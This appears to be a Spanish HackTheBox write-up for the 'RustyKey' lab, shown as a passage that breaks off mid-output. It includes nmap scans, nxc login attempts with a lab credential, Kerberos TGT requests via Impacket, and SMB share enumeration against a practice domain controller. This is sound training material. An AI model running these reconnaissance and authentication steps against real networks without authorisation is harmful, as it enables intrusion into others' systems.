+<p><img alt="Rustykey Machine" loading="lazy" src="/img/rustykey/rustykey_machine.png"></p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.75 -oG ports
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-01 05:42 +0200
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 05:42
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.75 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 47001/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49673/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49674/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49670/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49669/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49671/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49698/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49665/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49749/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49677/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 593/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49666/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49664/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 636/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 3269/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 9389/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 49667/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Discovered open port 3268/tcp on 10.10.11.75
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 05:42, 10.71s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.75
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.035s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-07-01 05:42:07 CEST <span class="k">for</span> 10s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65496</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, <span class="m">13</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE          REASON
+</span></span><span class="line"><span class="cl">53/tcp    open  domain           syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn      syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5         syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap   syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">5985/tcp  open  wsman            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">47001/tcp open  winrm            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49664/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49665/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49666/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49667/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49669/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49670/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49671/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49673/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49674/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49677/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49698/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49749/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 10.78 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">66648</span> <span class="o">(</span>2.933MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">65522</span> <span class="o">(</span>2.621MB<span class="o">)</span>
+</span></span></code></pre></div><p>Nos copiamos los puertos al portapapeles:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados:
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">53</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">88</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">135</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">139</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">445</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">464</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">593</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">636</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3268</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3269</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">5985</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">9389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">47001</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49664</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49665</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49666</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49667</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49669</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49670</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49671</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49673</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49674</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49677</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49698</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49749</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><p>Escaneo de servicios corriendo tras los puertos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49674,49677,49698,49749 10.10.11.75 -oG targeted
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-01 05:46 +0200
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> rustykey.htb <span class="o">(</span>10.10.11.75<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.11s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-07-01 04:46:59Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: rustykey.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: rustykey.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49673/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49674/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49698/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49749/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 193.78 seconds
+</span></span></code></pre></div><h2 id="autenticación-ntlm-deshabilitada">Autenticación NTLM deshabilitada<a hidden class="anchor" aria-hidden="true" href="#autenticación-ntlm-deshabilitada">#</a></h2>
+<p>Intentando enumerar las carpetas compartidas y usuarios, nos encontramos con un error llamado <code>STATUS_NOT_SUPPORTED</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.75 -u <span class="s1">&#39;rr.parker&#39;</span> -p <span class="s1">&#39;8#t5HE8L!W3A&#39;</span> --users
+</span></span><span class="line"><span class="cl">SMB         10.10.11.75     <span class="m">445</span>    10.10.11.75      <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.75<span class="o">)</span> <span class="o">(</span>domain:10.10.11.75<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.75     <span class="m">445</span>    10.10.11.75      <span class="o">[</span>-<span class="o">]</span> 10.10.11.75<span class="se">\r</span>r.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">❯ nxc smb 10.10.11.75 -u <span class="s1">&#39;rr.parker&#39;</span> -p <span class="s1">&#39;8#t5HE8L!W3A&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.75     <span class="m">445</span>    10.10.11.75      <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.75<span class="o">)</span> <span class="o">(</span>domain:10.10.11.75<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.75     <span class="m">445</span>    10.10.11.75      <span class="o">[</span>-<span class="o">]</span> 10.10.11.75<span class="se">\r</span>r.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">❯ nxc smb 10.10.11.75 -u <span class="s1">&#39;rr.parker&#39;</span> -p <span class="s1">&#39;8#t5HE8L!W3A&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.75     <span class="m">445</span>    10.10.11.75      <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.75<span class="o">)</span> <span class="o">(</span>domain:10.10.11.75<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.75     <span class="m">445</span>    10.10.11.75      <span class="o">[</span>-<span class="o">]</span> 10.10.11.75<span class="se">\r</span>r.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc ldap 10.10.11.75 -u <span class="s1">&#39;rr.parker&#39;</span> -p <span class="s1">&#39;8#t5HE8L!W3A&#39;</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.75     <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:rustykey.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.75     <span class="m">389</span>    DC               <span class="o">[</span>-<span class="o">]</span> rustykey.htb<span class="se">\r</span>r.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
+</span></span></code></pre></div><p>Esto parece indicar que tenemos la autenticación por NTLM desactivada. Entonces probamos a autenticar-nos mediante Kerberos con la opción (-k). Y ya podemos autenticar-nos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc ldap 10.10.11.75 -u <span class="s1">&#39;rr.parker&#39;</span> -p <span class="s1">&#39;8#t5HE8L!W3A&#39;</span> -k
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.75     <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:rustykey.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.75     <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> rustykey.htb<span class="se">\r</span>r.parker:8#t5HE8L!W3A
+</span></span></code></pre></div><blockquote>
+<p>Por el momento parece que vamos a tenernos que autenticar-nos mediante los Tickets Garanting Ticket (TGT) ya que o el usuario actual tiene la autenticación NTLM deshabilitada o quizá todos los usuarios del sistema.</p>
+</blockquote>
+<p>Primero empezamos configurando el archivo <code>krb5.conf</code> para que cuando nos intentemos autenticar mediante Kerberos pueda encontrar el Key Distribution Center (KDC).</p>
+<pre tabindex="0"><code>[libdefaults]
+    default_realm = RUSTYKEY.HTB
+    ticket_lifetime = 24h
+    renew_lifetime = 7d
+    forwardable = true
+    rdns = false
+
+[realms]
+    RUSTYKEY.HTB = {
+        kdc = DC.rustykey.htb
+        admin_server = DC.rustykey.htb
+        default_domain = rustykey.htb
+    }
+
+[domain_realm]
+    .rustykey.htb = RUSTYKEY.HTB
+    rustykey.htb = RUSTYKEY.HTB
+</code></pre><p>Una vez configurado, con la herramienta <code>getTGT.py</code> vamos a solicitar el Ticket Garanting Ticket (TGT) del usuario rr.parker, que nos devolverá un ticket en formato .ccache que luego exportaremos con la variable <code>KRB5CCNAME</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ getTGT.py rustykey.htb/rr.parker:<span class="s1">&#39;8#t5HE8L!W3A&#39;</span> -dc-ip 10.10.11.75
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in rr.parker.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/RustyKey/rr.parker.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:/home/borhub/Workspace/HTB/RustyKey/rr.parker.ccache
+</span></span><span class="line"><span class="cl">Default principal: rr.parker@RUSTYKEY.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting     Expires            Service principal
+</span></span><span class="line"><span class="cl">01/07/25 07:34:33  01/07/25 17:34:33  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
+</span></span></code></pre></div><h2 id="enumeración-smb--módulo-spider_plus---nxc">Enumeración SMB + Módulo Spider_plus - nxc<a hidden class="anchor" aria-hidden="true" href="#enumeración-smb--módulo-spider_plus---nxc">#</a></h2>
+<p>Ahora haciendo uso de la variable <code>FQDN</code> le indicamos que su valor sea el FQDN del DC, en este caso, <code>DC.rustykey.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ <span class="nb">export</span> <span class="nv">FQDN</span><span class="o">=</span>DC.rustykey.htb
+</span></span></code></pre></div><p>Una vez hecho esto, vamos a usar la opción <code>--use-kcache</code> de nxc para hacer uso de nuestro TGT (.ccache).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb <span class="s2">&#34;</span><span class="nv">$FQDN</span><span class="s2">&#34;</span> --use-kcache --shares
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:rustykey.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> RUSTYKEY.HTB<span class="se">\r</span>r.parker from ccache
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>Ahora haciendo uso del modulo spider_plus se guardarán todas las rutas disponibles dentro de las carpetas en un archivo JSON para si poder revisarlos directamente.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.75 <span class="s2">&#34;</span><span class="nv">$FQDN</span><span class="s2">&#34;</span> --use-kcache -M spider_plus
+</span></span><span class="line"><span class="cl">SMB         10.10.11.75     <span class="m">445</span>    10.10.11.75      <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.75<span class="o">)</span> <span class="o">(</span>domain:10.10.11.75<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:rustykey.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> RUSTYKEY.HTB<span class="se">\r</span>r.parker from ccache
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Started module spidering_plus with the following options:
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>  DOWNLOAD_FLAG: False
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>     STATS_FLAG: True
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> EXCLUDE_FILTER: <span class="o">[</span><span class="s1">&#39;print$&#39;</span>, <span class="s1">&#39;ipc$&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>   EXCLUDE_EXTS: <span class="o">[</span><span class="s1">&#39;ico&#39;</span>, <span class="s1">&#39;lnk&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>  MAX_FILE_SIZE: <span class="m">50</span> KB
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>  OUTPUT_FOLDER: /home/borhub/.nxc/modules/nxc_spider_plus
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         DC.rustykey.htb <span class="m">445</span>    DC               SYSVOL          READ            Logon server share
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Saved share-file metadata to <span class="s2">&#34;/home/borhub/.nxc/modules/nxc_spider_plus/DC.rustykey.htb.json&#34;</span>.
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> SMB Shares:           <span class="m">5</span> <span class="o">(</span>ADMIN$, C$, IPC$, NETLOGON, SYSVOL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> SMB Readable Shares:  <span class="m">3</span> <span class="o">(</span>IPC$, NETLOGON, SYSVOL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> SMB Filtered Shares:  <span class="m">1</span>
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Total folders found:  <span class="m">23</span>
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Total files found:    <span class="m">5</span>
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> File size average:    1.63 KB
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> File size min:        <span class="m">23</span> B
+</span></span><span class="line"><span class="cl">SPIDER_PLUS DC.rustykey.htb <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> File size max:        4.58 KB
+</span></span><span class="line"><span class="cl">Running nxc against <span class="m">2</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+</span></span></code></pre></div><p>Y ahora viendo el archivo que nos ha creado el escaneo podemos revisar las rutas encontradas en el SMB. Pero no nos interesa nada de lo encontrado:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cat /home/borhub/.nxc/modules/nxc_spider_plus/DC.rustykey.htb.json <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;NETLOGON&#34;</span>: <span class="o">{}</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;SYSVOL&#34;</span>: <span class="o">{</span>
